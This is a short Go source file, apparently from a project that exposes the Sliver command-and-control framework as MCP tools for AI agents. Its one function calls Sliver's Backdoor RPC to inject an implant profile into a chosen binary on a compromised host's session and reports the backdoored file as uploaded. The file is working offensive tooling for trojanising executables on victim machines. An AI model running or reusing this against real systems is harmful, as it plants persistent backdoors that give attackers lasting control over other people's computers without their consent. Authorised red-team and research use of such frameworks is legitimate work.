package sliver_cmd

import (
	"context"
	"errors"
	"fmt"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	c "github.com/xsxz/sliver-mcp/sliver/client"
)

func Backdoor(client *c.SliverClient, sessionID string, profileName string, remoteFilePath string) (string, error) {
	session, err := client.GetSessionByID(sessionID)
	if err != nil {
		return "", err
	}

	backdoor, err := client.RPC.Backdoor(context.Background(), &sliverpb.BackdoorReq{
		FilePath:    remoteFilePath,
		ProfileName: profileName,
		Request:     client.MakeSessionRequest(session),
	})

	if err != nil {
		return "", err
	}

	if backdoor.Response != nil && backdoor.Response.Err != "" {
		return "", errors.New(backdoor.Response.Err)
	}

	return fmt.Sprintf("Uploaded backdoor'd binary to %s\n", remoteFilePath), nil
}
